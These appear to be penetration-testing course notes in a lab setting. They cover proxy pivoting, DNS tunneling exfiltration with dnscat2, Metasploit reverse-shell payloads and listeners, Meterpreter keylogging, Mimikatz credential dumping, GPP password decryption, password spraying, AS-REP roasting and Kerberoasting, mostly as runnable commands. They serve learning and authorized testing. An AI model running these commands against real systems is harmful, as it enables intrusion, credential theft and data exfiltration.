The **OpenBSD** version of Netcat, which exposes the **-X** flag and can connect to a SOCKS or HTTP proxy. However, **the version of Netcat that ships with Kali doesn't support proxying.**

=> use **Ncat**, the Netcat alternative written by the maintainers of Nmap.

Tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080` (same result as the above command)

```bash
proxychains ssh database_admin@10.4.50.215
```

HTTPTunnel-ing

```bash
sudo apt install httptunnel
```

```bash
ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
hts --forward-port localhost:8888 1234
htc --forward-port 8080 10.11.0.128:1234
rdesktop 127.0.0.1:8080
```

## DNS Tunneling

The process of resolving the IPv4 address of "`www.example.com`":
- In most cases, we'll ask a **DNS recursive resolver server** (e.g., Google has a public DNS server at 8.8.8.8) for the DNS address record (A record) of the domain
- Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of **root name servers**. Its first task is to send a DNS query to one of these root name servers. Because `example.com` has the "`.com`" suffix, the root name server will respond with the address of a DNS name server that's responsible for the `.com` top-level domain (TLD), aka **TLD name server**.
- The recursive resolver then queries the `.com` TLD name server, asking which DNS server is responsible for `example.com`. The TLD name server will respond with the **authoritative name server** for the `example.com` domain.
- The recursive resolver then asks the example.com authoritative name server for the IPv4 address of `www.example.com`. The `example.com` authoritative name server replies with the A record for that.
- The recursive resolver then returns that to us.

All these requests and responses are transported over UDP, with **UDP/53** being the standard DNS port.

In the real world, we will have registered the `feline.corp` domain name ourselves, set up the **authoritative name server** machine ourselves, and told the **domain registrar** that this server should be known as the authoritative name server for the `feline.corp` zone.

To simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using **Dnsmasq**. FELINEAUTHORITY is registered within this network as the **authoritative name server** for the feline.corp zone. MULTISERVER is also configured as the **DNS resolver server** for PGDATABASE.

We can transfer small amounts of information (exfiltrated data) from inside the network to the outside, without a direct connection, just by making DNS queries.

Imagine we have a binary file we want to exfiltrate from PGDATABASE.
- We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp.
- On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.

**Infiltrate** data into a network.
- The TXT record is designed to be general-purpose, and contains "arbitrary string information".
=> **We can serve TXT records from FELINEAUTHORITY using Dnsmasq**.

A **dnscat2** server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

The dnscat2 process is using CNAME, TXT, and MX queries and responses.

DNS tunneling is certainly not stealthy, i.e., a huge data transfer from the dnscat2 client to the server. All the request and response payloads are encrypted.

* -C: start the dnsmasq process with the `dnsmasq.conf` configuration file
* -d: runs in "no daemon" mode so it runs in the foreground

```bash
sudo dnsmasq -C dnsmasq.conf -d
```

Check the client DNS settings

```bash
resolvectl status

nslookup exfiltrated-data.feline.corp
nslookup -type=txt www.feline.corp
```

A **dnscat2** server runs on an authoritative name server for a particular domain

```bash
dnscat2-server feline.corp
```

Run the dnscat client binary on PGDATABASE

```bash
./dnscat feline.corp
```

This configuration ignores the `/etc/resolv.conf` and `/etc/hosts` files and only defines the `auth-zone` and `auth-server` variables. These tell Dnsmasq to act as the authoritative name server for the feline.corp zone.

`dnsmasq_txt.conf`

```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

```
$ dnscat2-server feline.corp
dnscat2> windows
dnscat2> window -i 1
command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows

command (pgdatabase01) 1> listen --help
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
```

# The Metasploit Framework

## Metasploit Essentials

Start the database service as well as create and initialize the MSF database

```bash
sudo msfdb init
```

* -q: hide the banner and version information while starting up

```bash
sudo msfconsole -q
```

```
help

db_status

workspace
workspace -a pen200

db_nmap -A 192.168.50.202

hosts
vulns
creds
services
services -p 8000

show -h
show auxiliary

search Apache 2.4.49
search type:auxiliary smb
```

Activate a module with **module name**, or **index** (56) provided from search results

```
use 56
```

Get information about the currently activated module<br/> - Potential side effects of running it, such as **Indicators of compromise** entries in log solutions, artifacts on disk.<br/> - Module stability help us predict if we may crash a target system or what information defenders may obtain from us using this exploit module.<br/> - Module reliability determines if we can run the exploit more than once, e.g., repeatable-session, as some exploit modules will only work once.<br/> - Available targets range from different operating systems and application versions to command execution methods. Most modules provide the Automatic target, which Metasploit tries to identify either by itself or by using the default operation specified by the module.<br/> - Check supported determines if we can use the `check` command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.<br/> - Description provides us a text-based explanation of the module's purpose.

```
info
```

```
show options
set RHOSTS 192.168.50.202
services -p 445 --rhosts
unset RHOSTS

show payloads
set payload 11
set payload payload/linux/x64/meterpreter_reverse_tcp

run
run -j
Ctrl + Z

jobs
```

Metasploit uses **sessions** to manage access to different machines.

```
sessions -l
sessions -i 2
sessions -k 2
```

## Metasploit Payload

A **non-staged** payload is sent in its entirety along with the exploit. => the payload contains the exploit and full shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.

A **staged** payload is usually sent in 2 parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

Situations in which we would prefer to use a staged payload:
- If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller.
- antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.

Metasploit contains the **Meterpreter** payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the **post-exploitation** phase and exists for various operating systems such as Windows, Linux, macOS, Android, ...

Commands with "l" as prefix operate on the local system, i.e., our Kali VM.

If our target runs the Windows OS, we need to **escape the backslashes** in the destination path with backslashes like "\\".

Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which **dumps the contents of the SAM database** or screenshare, which displays the target machine's desktop in real-time.

When Metasploit interacts with a system within a session, it uses a concept named **channels**.

```bash
msfvenom -l payloads --platform windows --arch x64
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

## Meterpreter Command

### Session

```
help
sysinfo
getuid
idletime
ps
getsystem
migrate 8052
execute -H -f notepad

shell

channel -l
channel -i 1

bg
exit
```

```
lpwd
lcd /home/kali/Downloads
download /etc/passwd
lcat /home/kali/Downloads/passwd
upload /usr/bin/unix-privesc-check /tmp/
upload chisel.exe C:\\Users\\marcus\\chisel.exe
```

### Channel

```
Ctrl + Z
```

## Post-Exploitation with Metasploit

### Metasploit Command

```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 9
set LHOST 192.168.119.4
run
```

Add a route to a network reachable through a compromised host manually

```
route add 172.16.5.0/24 12
route print
```

TCP port scan via the compromised machine

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

The new shell on the target must be a bind shell, because a reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network

```
use exploit/windows/smb/psexec
set SMBUser luiza
set SMBPass "Bocci"
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

As an alternative to adding routes manually, we can use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session automatically. 

Remove the route we set manually

```
route flush
```

```
use multi/manage/autoroute
set session 12
run
```

We could now use the psexec module as we did before, but we can also combine routes with the `server/socks_proxy` auxiliary module to configure a SOCKS proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default.

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

Update our proxychains configuration file (`/etc/proxychains4.conf`) to take advantage of the SOCKS5 proxy: `socks5 127.0.0.1 1080`

```bash
proxychains xfreerdp /v:172.16.5.200 /u:luiza /d:sandbox
```

### Meterpreter Command

```
screenshot

keyscan_start
keyscan_dump
keyscan_stop
```

Retrieve LM/NTLM creds (parsed)

```
load kiwi
help
creds_msv
```

List the tokens

```
use incognito
list_tokens -u
impersonate_token sandbox\\Administrator
```

Create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)

```
portfwd -h
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

```bash
xfreerdp /v:127.0.0.1 /u:luiza
```

## Resource Scripts

Configure the AutoRunScript option to automatically execute a module after a session was created. E.g., the `post/windows/manage/migrate` module will cause the spawned Meterpreter to automatically launch a background `notepad.exe` process and migrate to it.

**Automating process migration** helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.

`set ExitOnSession false` to ensure that the listener keeps accepting new connections after a session is created.

Some of these scripts use the global datastore of Metasploit to set options such as RHOSTS.
- When we use `set` or `unset`, we define options in the context of a running module.
- We can also define values for options across all modules by setting global options. These options can be set with `setg` and unset with `unsetg`.

`listener.rc`

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

```bash
sudo msfconsole -r listener.rc
```

There are resource scripts provided for port scanning, brute forcing, protocol enumerations, and so on.

```bash
ls -l /usr/share/metasploit-framework/scripts/resource
```

# Active Directory Introduction and Enumeration

If an attacker compromises a member of **Domain Admins** group, they essentially gain complete control over the domain.

An AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest.

While there is a "Domain Admins" group for each domain in the forest, members of the **Enterprise Admins** group are granted full control over all the domains in the forest and have Administrator privilege on all DCs.

## Active Directory - Manual Enumeration

Use PowerShell and .NET classes to create a script that enumerates the domain.

Leverage an **Active Directory Services Interface (ADSI)** as an LDAP provider. We need a specific LDAP **ADsPath** to communicate with the AD service:

`LDAP://HostName[:PortNumber][/DistinguishedName]`

- **Hostname** can be a computer name, IP address or a domain name, e.g. `corp.com`. A domain may have multiple DCs. The DC that holds the most updated information is the **Primary Domain Controller (PDC)**. There can be only one PDC in a domain. => Find the DC holding the **PdcRoleOwner** property.

- The **PortNumber** is optional. It will automatically choose the port based on whether or not we are using an SSL connection. If we come across a domain using non-default ports, manually add this to the script.

- **DistinguishedName** (DN) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD, including the domain itself.

E.g., stephanie is a user object within the `corp.com` domain:

`CN=Stephanie,CN=Users,DC=corp,DC=com`

- CN: **Common Name** specifies the identifier of an object in the domain. If we added `CN=Users` to our LDAP path, we would restrict ourselves by only being able to search objects within that given container.

- "DC": **Domain Component** represents the top of an LDAP tree or the "Distinguished Name" of the domain itself, `DC=corp,DC=com`.

```pwsh
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```bat
net user /domain
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain
```

```bat
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain
```

`.\enumeration.ps1`

```pwsh
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)

# enumerate all users in the domain and extract all the properties for each object
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}

# display the groups "jeffadmin" is a member of
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }
    Write-Host "-------------------------------"
}
```

`function.ps1`

```pwsh
function LDAPSearch {
    param (
        [string]$LDAPQuery
     )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()
}
```

```pwsh
Import-Module .\function.ps1

# User enumeration
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

LDAPSearch -LDAPQuery "(objectclass=group)"

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }

$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member

LDAPSearch -LDAPQuery "serviceprincipalname=*http*"
```

```pwsh
Import-Module .\PowerView.ps1
```

```pwsh
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer | select dnshostname | Resolve-IPAddress
```

## Manual Enumeration - Expanding our Repertoire

PowerView's `Find-LocalAdminAccess` command scans the network to determine if our current user has administrative permissions on any computers in the domain.

The command relies on the **OpenServiceW** function, which will connect to the **Service Control Manager (SCM)** on the target machines. The SCM essentially maintains a database of installed services and drivers on Windows computers. PowerView will attempt to open this database with the **SC_MANAGER_ALL_ACCESS** access right, which require administrative privileges, and if the connection is successful => our current user has administrative privileges on the target machine.

The command supports parameters such as **Computername** and **Credentials**.

Run it without parameters to spray the environment to find possible local administrative access on computers under the current user context.

```pwsh
Find-LocalAdminAccess
```

To know which user is logged in to which computer, **historically**, the 2 most reliable Windows APIs are **NetWkstaUserEnum** and **NetSessionEnum**. The former requires administrative privileges, while the latter does not.

PowerView's `Get-NetSession` command uses the **NetWkstaUserEnum** and **NetSessionEnum** APIs under the hood. Due to permissions, **NetSessionEnum** will not be able to obtain this type of information on default **Windows 11** (returns an "Access is denied"):

- There are 5 possible query levels: 0, 1, 2, 10, 502.
  - Levels 10 and 502, both should return information such as the name of the computer and name of the user establishing the connection.

By default, PowerView uses query level 10 with NetSessionEnum.

The permissions required to enumerate sessions with NetSessionEnum are defined in the **SrvsvcSessionInfo** registry key, `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity` hive.

```pwsh
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

The long string in the end of the output is a **capability SID** which is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources.

- In older Windows versions (before Windows Server 2019 build 1809), **Authenticated Users** were allowed to access the registry hive and obtain information from the **SrvsvcSessionInfo** key.

- On older Windows 11, regular domain users should not be able to acquire this information within the domain.

```pwsh
Get-NetSession -ComputerName files04 -Verbose
```

**PsLoggedOn** from the **SysInternals Suite** enumerates the registry keys under `HKEY_USERS` to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames. PsLoggedOn will also use the NetSessionEnum API to see who is logged on to the computer via resource shares.

PsLoggedOn relies on the **Remote Registry** service to scan the associated key. The "Remote Registry" service has not been enabled by default on Windows workstations since Windows 8, but sysadmin may enable it for various administrative tasks, for installing monitoring/deployment tools, scripts, agents, etc.

It is also enabled by default on later Windows **Server** OS such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). If it is enabled, the service will stop after 10 minutes of inactivity to save resources, but it will re-enable (with an automatic trigger) once we connect with PsLoggedOn.

```pwsh
.\PsLoggedon.exe \\files04
```

**Services** launched by the system itself run in the context of a **Service Account**, e.g. LocalSystem, LocalService, and NetworkService.

For more complex applications, a **domain user account** may be used to provide the needed context while still maintaining access to resources inside the domain.

When applications like Exchange, MS SQL, or IIS are integrated into AD, a unique service instance identifier known as **Service Principal Name (SPN)** associates a service to a specific service account in AD.

**Managed Service Accounts** were designed for complex applications, which require tighter integration with AD.

Larger applications like MS SQL and Microsoft Exchange often required **server redundancy** when running to guarantee availability, but Managed Service Accounts did not support this.

=> **Group Managed Service Accounts** were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher.

Obtain a list of SPNs

```pwsh
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Discovered the **iis_service** user

```pwsh
setspn -L iis_service
```

```pwsh
nslookup web04.corp.com
```

An object in AD may have a set of permissions applied to it with multiple **Access Control Entries (ACE)**. These ACEs make up the **Access Control List (ACL)**. Each ACE defines whether access to the specific object is allowed or denied.

E.g., A domain user attempts to access a domain share. The targeted object, i.e. the share, will then go through a validation check based on the ACL to determine if the user has permissions to the share. This ACL validation involves 2 main steps.

- In an attempt to access the share, the user will send an access token, which consists of the user identity and permissions.

- The target object will then validate the token against the list of permissions (the ACL).

AD includes permission types that can be used to configure an ACE:
- **GenericAll**: Full permissions on object
- **GenericWrite**: Edit certain attributes on the object
- **WriteOwner**: Change ownership of the object
- **WriteDACL**: Edit ACE's applied to object
- **AllExtendedRights**: Change password, reset password, etc.
- **ForceChangePassword**: Password change for object
- **Self (Self-Membership)**: Add ourselves to e.g. a group

Enumerate a user to determine which ACEs are applied to it, the output lists Security Identifiers (SID), and **ActiveDirectoryRights** property describes the type of permission applied to the object

Determine which ACEs are applied to user stephanie

```pwsh
Get-ObjectAcl -Identity stephanie -ResolveGUIDs
```

The **ActiveDirectoryRights** property describes the type of permission applied to the object.

To find out who has the permission, convert the **SecurityIdentifier** value.

```pwsh
Convert-SidToName S-1-5-21-...-1104
```

Filter the ActiveDirectoryRights property

```pwsh
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
```

```pwsh
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
```

**SYSVOL** is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the domain controller and every domain user has access to it.

Historically, system administrators often changed local workstation passwords through **Group Policy Preferences** (GPP). However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN. We can use this key to decrypt these encrypted passwords.

Find the shares in the domain (add the `-CheckShareAccess` flag to display shares only available to us)

```pwsh
Find-DomainShare
Find-DomainShare -CheckShareAccess
```

Older domain policy file contains an encrypted password for the **local built-in Administrator account** (cpassword)

```pwsh
ls \\dc1.corp.com\sysvol\corp.com\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

Decrypts a given GPP encrypted string

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

## Active Directory - Automated Enumeration

```pwsh
Import-Module .\Sharphound.ps1

Get-Help Invoke-BloodHound

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp"
```

The Neo4j service is available at `http://localhost:7474`, default credentials are neo4j as both username and password.

```bash
sudo neo4j start

bloodhound
```

Raw query to display
- all computers identified by the collector
- all user accounts on the domain
- all active user sessions on machines

```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

Pre-built queries:
- Find all Domain Admins
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals
- List all Kerberoastable Accounts

# Attacking Active Directory Authentication

## Understanding Active Directory Authentication

**NTLM authentication** is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the AD-integrated DNS server. Likewise, 3rd-party applications may choose to use NTLM authentication instead of Kerberos.

The NTLM authentication protocol consists of 7 steps:
1. The computer calculates a cryptographic hash, called the **NTLM hash**, from the user's **password**.

2. The client computer sends the **username** to the server, which returns a random value called the **nonce** or challenge.

3. The client encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.

4. The server forwards the response along with the username and the nonce to the domain controller. The validation is then performed by the domain controller, since it already knows the NTLM hash of all users.

5. The domain controller encrypts the nonce itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.

**Kerberos** is the default authentication protocol in AD and for associated services.

While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.

- With NTLM authentication, the client starts the authentication process with the application server itself.

- Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

1. When a user logs in to their workstation, an **Authentication Server Request (AS-REQ)** is sent to the domain controller. The domain controller, acting as a KDC, also maintains the "Authentication Server" service. The AS-REQ contains a **timestamp** that is encrypted using a hash derived from the password of the user and their username.

2. When the domain controller receives the request, it looks up the password hash associated with the specific user in the `ntds.dit` file and attempts to decrypt the timestamp.
    - If the decryption process is successful and the timestamp is not a duplicate, the authentication is considered successful.
    - If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.

3. The domain controller replies to the client with an **Authentication Server Reply (AS-REP)**. Since Kerberos is a stateless protocol, the AS-REP contains a **session key** and a **Ticket Granting Ticket (TGT)**.
   - The session key is encrypted using the user's password hash and may be decrypted by the client and then reused.
   - The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key. To avoid tampering, the TGT is encrypted by a secret key (**NTLM hash** of the **krbtgt** account) known only to the KDC and cannot be decrypted by the client.

4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for 10 hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.

5. When the user wishes to access resources of the domain, e.g. a network share or a mailbox, it must again contact the KDC. This time, the client constructs a **Ticket Granting Service Request (TGS-REQ)** packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.

6. The ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. At this point the KDC performs several checks:
   - The TGT must have a valid timestamp.
   - The username from the TGS-REQ has to match the username from the TGT.
   - The client IP address needs to coincide with the TGT IP address.

7. If this verification process succeeds, the ticket-granting service responds to the client with a **Ticket Granting Server Reply (TGS-REP)**. This packet contains 3 parts:
   - The name of the service for which access has been granted.
   - A session key to be used between the client and the service.
   - A service ticket containing the username and group memberships along with the newly-created session key.

8. The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT. The service ticket is encrypted using the **password hash of the service account** registered with the service in question.

9. Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.

10. The client sends the application server an **Application Request (AP-REQ)**, which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.

11. The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the AP-REQ. If the AP-REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.

## Cached AD Credentials

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

To prevent tools such as Mimikatz from extracting hashes, enable additional **LSA Protection**. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.

- For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm.

- For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available.

- On older OS like Windows 7, or OS that have it manually set, **WDigest** will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.

```pwsh
.\mimikatz.exe
```

* `privilege::debug`: enable the **SeDebugPrivilege** access right
* `sekurlsa::logonpasswords`: extract plaintext passwords and password hashes from all available sources.

```
privilege::debug
sekurlsa::logonpasswords
```

Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS.

List the contents of the SMB share on WEB04. This will create and cache a service ticket

```pwsh
dir \\web04.corp.com\backup
```

* `sekurlsa::tickets`: show the tickets that are stored in memory

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.

```
sekurlsa::tickets
```

Microsoft provides the AD role Active Directory Certificate Services (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.

If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates. 

E.g., we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via Smart Cards.

These certificates may be marked as having a non-exportable private key for security reasons. If so, a private key associated with a certificate cannot be exported even with administrative privileges.

The **crypto** module contains the capability to either patch the CryptoAPI function with `crypto::capi` or KeyIso service with `crypto::cng`, making non-exportable keys exportable.

## Performing Attacks on Active Directory Authentication

### Password Spraying

Obtain the account policy

```pwsh
net accounts
```

The DirectoryEntry constructor can be used with 3 arguments, including the LDAP path to the domain controller, the username, and the password

- If the password for the user account is correct, the object creation will be successful
- If the password is invalid, no object will be created and we will receive an exception

```pwsh
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

Create a PowerShell script that enumerates all users and performs authentications according to the **Lockout threshold** and **Lockout observation window**.

* -Pass: set a single password to test, or
* -File: submit a wordlist file
* -Admin: test admin accounts

```pwsh
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

Password spraying attack against AD users leverages SMB comes with some drawbacks. For every authentication attempt, a full SMB connection has to be set up and then terminated. => noisy due to the generated network traffic and quite slow.

* --continue-on-success: avoid stopping at the first valid credential

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

Password spraying attack based on obtaining a TGT.

Using **kinit** on a Linux system, we can obtain and cache a Kerberos TGT. If a username and password are valid, we'll obtain a TGT. It only uses 2 UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.

**kerbrute** is cross-platform. Make sure that the encoding of `usernames.txt` is ANSI. Use Notepad's Save As functionality to change the encoding.

```pwsh
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

### AS-REP Roasting

The 1st step of the authentication process via Kerberos (commonly referred to as **Kerberos preauthentication**) is to send an AS-REQ. If the authentication is successful, the domain controller replies with an AS-REP containing the session key and TGT.

Without **Kerberos preauthentication** in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.

By default, the AD user account option **Do not require Kerberos preauthentication** is disabled

=> Kerberos preauthentication is performed for all users.

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Perform AS-REP Roasting on Windows with Rubeus

* /nowrap: prevent new lines being added to the resulting AS-REP hashes

```pwsh
.\Rubeus.exe asreproast /nowrap
```

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Identify users with the enabled AD user account option **Do not require Kerberos preauthentication**,

```pwsh
Get-DomainUser -PreauthNotRequired
```

If we have **GenericWrite** or **GenericAll** permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account.

=> Modify the **User Account Control** value of the user to not require Kerberos preauthentication, aka **Targeted AS-REP Roasting**. Then reset the User Account Control value of the user once we've obtained the hash.

### Kerberoasting

When a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the **password hash of the SPN**.

When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed as a second step only when connecting to the service itself.

=> With the SPN to target, request a service ticket for it from the domain controller. The service ticket is encrypted using the SPN's password hash.

Request the ticket and decrypt it using brute force or guessing => cleartext password of the service account.

=> If the domain contains high-privilege service accounts with **weak passwords**

However, if the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, making cracking infeasible. The same is true for the **krbtgt** user account which acts as service account for the KDC.

If we have **GenericWrite** or **GenericAll** permissions on another AD user account, we could reset the user's password but this may raise suspicion.

=> Set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.

```pwsh
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```bash
